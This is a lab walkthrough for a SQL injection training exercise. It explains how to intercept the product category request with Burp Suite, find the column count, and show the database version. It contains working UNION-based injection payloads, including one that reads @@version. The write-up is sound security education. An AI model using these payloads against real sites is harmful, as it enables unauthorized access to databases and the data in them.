# Lab 7: SQL injection attack, querying the database type and version on MySQL and Microsoft

### 🧪 Lab Overview

This lab contains a **SQL injection vulnerability** in the **product category filter**.

You can exploit this flaw by performing a **UNION-based SQL injection** to retrieve the results from an injected query.

🎯 **Objective:**

Display the **database version string**.

### **Solution**

### 1️⃣ Intercept the Request

Use **Burp Suite** to **intercept and modify** the request that sets the product category filter.

---

![Screenshot from 2025-05-20 20-43-50.png](LabImg/Screenshot_from_2025-05-20_20-43-50.png)

### 2️⃣ Identify Columns and Data Types

Determine the number of columns returned by the SQL query and which of them support **text data**.

💡 Use this **payload** in the `category` parameter:

```sql
'+UNION+SELECT+'abc','def'#
```

![Screenshot from 2025-05-20 20-44-07.png](LabImg/Screenshot_from_2025-05-20_20-44-07.png)

✔️ This confirms that the query is returning **two columns**, both of which can handle **string data**.

### 3️⃣ Display the Database Version

🎯 Use the following SQL injection **payload** to retrieve and display the **database version**:

```sql
'+UNION+SELECT+@@version,+NULL#
```

![Screenshot from 2025-05-20 20-56-03.png](LabImg/Screenshot_from_2025-05-20_20-56-03.png)

![Screenshot from 2025-05-20 20-56-34.png](LabImg/Screenshot_from_2025-05-20_20-56-34.png)

![Screenshot from 2025-05-20 20-55-37.png](LabImg/Screenshot_from_2025-05-20_20-55-37.png)

When successful, this query reveals valuable metadata by displaying the current **DBMS version** in the application's response.

### **Community solutions**

> [https://youtu.be/4UxUpsCZQfI](https://youtu.be/4UxUpsCZQfI)
>